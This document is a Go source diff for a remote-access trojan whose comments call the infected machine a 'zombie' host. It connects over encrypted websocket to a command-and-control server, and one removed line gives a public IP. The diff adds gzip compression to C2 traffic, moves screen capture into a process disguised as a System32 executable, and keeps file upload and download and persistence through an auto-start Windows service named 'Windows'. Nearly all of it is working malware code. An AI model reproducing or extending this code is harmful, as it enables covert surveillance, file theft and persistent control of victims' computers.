@@ -2,17 +2,16 @@ package main
 
 import (
 	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"github.com/denisbrodbeck/machineid"
 	"github.com/kardianos/service"
-	"github.com/kbinani/screenshot"
 	"github.com/xxtea/xxtea-go/xxtea"
 	"golang.org/x/net/websocket"
 	"golang.org/x/text/encoding/simplifiedchinese"
-	"image/png"
 	"io"
 	"io/ioutil"
 	"net"
@@ -42,9 +41,8 @@ const (
 )
 
 var (
-	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl      = "124.156.100.149:8080"
-	baseUrl      = "106.54.242.217"
+	baseUrl = "127.0.0.1" //"172.16.5.1"
+	scName       = "Windows"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -62,11 +60,13 @@ type Message struct {
 	Name      string `json:"name"`
 	Msg       string `json:"msg"`
 
+	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
 	FileName string `json:"fileName"`
-	FileBody string `json:"fileBody"`
+	//FileBody string `json:"fileBody"`
 }
 
 type Host struct {
+	Terrace  string `json:"terrace"`
 	Hostname string `json:"hostname"`
 	Whoami   string `json:"whoami"`
 }
@@ -115,24 +115,19 @@ func begin() {
 				msgs <- message
 			} else if reqM.Name == UPLOAD_FILE { //上传文件到肉鸡
 				message.Name = SEND_MSG
-				fileBytes, err := base64.StdEncoding.DecodeString(reqM.FileBody) //base64 dec
+				file, err := os.Create(reqM.FileName) //创建文件
 				if err != nil {
 					message.Msg = "upload " + reqM.FileName + " error " + err.Error()
 				} else {
-					file, err := os.Create(reqM.FileName) //创建文件
+					_, err = file.Write(reqM.ByteData) //写入文件
 					if err != nil {
 						message.Msg = "upload " + reqM.FileName + " error " + err.Error()
 					} else {
-						_, err = file.Write(fileBytes) //写入文件
-						if err != nil {
-							message.Msg = "upload " + reqM.FileName + " error " + err.Error()
-						} else {
-							message.Msg = "upload " + reqM.FileName + " OK!"
-						}
+						message.Msg = "upload " + reqM.FileName + " OK!"
 					}
-					if file != nil {
-						file.Close()
-					}
+				}
+				if file != nil {
+					file.Close()
 				}
 				msgs <- message
 			} else if reqM.Name == DOWNLOAD_FILE { //下载文件到控制台
@@ -143,11 +138,11 @@ func begin() {
 					msgs <- message
 				} else if len(fileByts) > 0 {
 					message.Name = DOWNLOAD_FILE
-					file64Str := base64.StdEncoding.EncodeToString(fileByts) //base64
+					//file64Str := base64.StdEncoding.EncodeToString(fileByts) //base64
 					strs := strings.Split(reqM.Msg, "/")
 					fileNeme := strs[len(strs)-1]
 					message.FileName = fileNeme
-					message.FileBody = file64Str
+					message.ByteData = fileByts
 					msgs <- message
 				}
 			} else if reqM.Name == SLEEP_ROUSE { //设置休眠
@@ -174,51 +169,41 @@ func begin() {
 				conn.Close()
 				os.Exit(0)
 			} else if reqM.Name == ON_SCREEN { //打开监控屏幕
-				message.Name = ON_SCREEN
-				intervalTime, _ := strconv.Atoi(reqM.Msg) //截屏间隔时间毫秒
-				if intervalTime == 0 {                    //传错参数则纠正为1秒一次
-					intervalTime = 1000
-				}
-				ScreenFlag = true //打开开关
-				go onScreen(message, intervalTime)
-			} else if reqM.Name == OFF_SCREEN { //关闭监控屏幕
-				message.Name = OFF_SCREEN
-				ScreenFlag = false
+				//message.Name = ON_SCREEN
+				go callScreen(reqM.Msg, baseUrl)
 			}
 		}
 		time.Sleep(time.Duration(sleepTime) * time.Second) //休眠中
 	}
 }
 
-//监控屏幕=====================================================================================================
-var (
-	ScreenFlag = false
-	screenLock = false //保证单例
-) //默认关闭的开关
-
-func onScreen(message Message, intervalTime int) { //监控屏幕
-	if screenLock == true {
-		return
-	}
-	defer func() { screenLock = false }()
-	screenLock = true
-
-	for {
-		if ScreenFlag == false { //已关闭，需要退出
-			return
-		}
-		img, _ := screenshot.CaptureDisplay(0)
-		var b bytes.Buffer
-		_ = png.Encode(&b, img)
-		file64Str := base64.StdEncoding.EncodeToString(b.Bytes()) //base64
-		message.Msg = file64Str
-		err := sendMessage(message)
-		if err != nil { //连接出错
-			return
-		}
-		time.Sleep(time.Duration(intervalTime) * time.Millisecond) //间隔时间
-	}
+func callScreen(intervalTime, url string) { //监控屏幕
+	StartProcessAsCurrentUser("C:\\Windows\\System32\\System32.exe", "C:\\Windows\\System32\\System32.exe "+intervalTime+" "+url, "C:\\Windows\\System32", true)
 }
+
+//func onScreen(message Message, intervalTime int) { //监控屏幕
+//	if screenLock == true {
+//		return
+//	}
+//	defer func() { screenLock = false }()
+//	screenLock = true
+//
+//	for {
+//		if ScreenFlag == false { //已关闭，需要退出
+//			return
+//		}
+//		img, _ := screenshot.CaptureDisplay(0)
+//		var b bytes.Buffer
+//		_ = png.Encode(&b, img)
+//		file64Str := base64.StdEncoding.EncodeToString(b.Bytes()) //base64
+//		message.Msg = file64Str
+//		err := sendMessage(message)
+//		if err != nil { //连接出错
+//			return
+//		}
+//		time.Sleep(time.Duration(intervalTime) * time.Millisecond) //间隔时间
+//	}
+//}
 
 //监控屏幕=====================================================================================================
 
@@ -238,7 +223,7 @@ wait:
 			if whoami == "" {
 				whoami, _ = execShell("whoami")
 			}
-			host := Host{Hostname: hostname, Whoami: whoami}
+			host := Host{Hostname: hostname, Whoami: whoami, Terrace: terrace}
 			hostJsonBytes, _ := json.Marshal(host) //结构体转json
 			message.Msg = string(hostJsonBytes)
 			//now := time.Now().Format("2006-01-02 15:04:05")
@@ -261,6 +246,7 @@ wait:
 	}
 }
 
+//读取数据
 func readMessage(conn *websocket.Conn) ([]byte, error) {
 again:
 	fr, err := conn.NewFrameReader()
@@ -279,13 +265,15 @@ again:
 	if err != nil {
 		return reqBytes, err
 	}
-	reqBytes = encDec(reqBytes) //解密数据
+	reqBytes = encDec(reqBytes)      //解密数据
+	reqBytes = UnGzipBytes(reqBytes) //解压数据
 	return reqBytes, nil
 }
 
 //发送websocket消息
 func sendMessage(message Message) error {
 	jsonBytes, _ := json.Marshal(message) //结构体转json
+	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
 	jsonBytes = encDec(jsonBytes)         //加密
 	if conn != nil {
 		_, err := conn.Write(jsonBytes) //发送消息
@@ -293,6 +281,32 @@ func sendMessage(message Message) error {
 	} else {
 		return errors.New("conn is null pointer")
 	}
+}
+
+//gzip压缩
+func gzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	//zw := gzip.NewWriter(&buf)
+	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)
+
+	zw.Write(byt)
+	if err := zw.Close(); err != nil {
+	}
+	return buf.Bytes()
+}
+
+//gzip解压缩
+func UnGzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	buf.Write(byt)
+	zr, _ := gzip.NewReader(&buf)
+	defer func() {
+		if zr != nil {
+			zr.Close()
+		}
+	}()
+	a, _ := ioutil.ReadAll(zr)
+	return a
 }
 func json2Message(strByte []byte) (Message, error) {
 	var dat Message
@@ -383,12 +397,12 @@ func fork() {
 
 	_, err := fileCopy(os.Args[0], dst, dstFileName)
 	if err != nil {
-		os.Exit(0)
+		//os.Exit(0)
 		return
 	} else {
-		execShell("sc create Windows binPath= C:/Windows/System32/Windows.exe start= auto displayname= Windows")
-		execShell("sc description Windows Windows operating system core")
-		execShell("sc start Windows")
+		execShell("sc create Windows binPath= C:/Windows/System32/" + scName + ".exe start= auto displayname= " + scName)
+		execShell("sc description " + scName + " " + scName + "")
+		execShell("sc start " + scName)
 		os.Exit(0) //退自己
 	}
 }
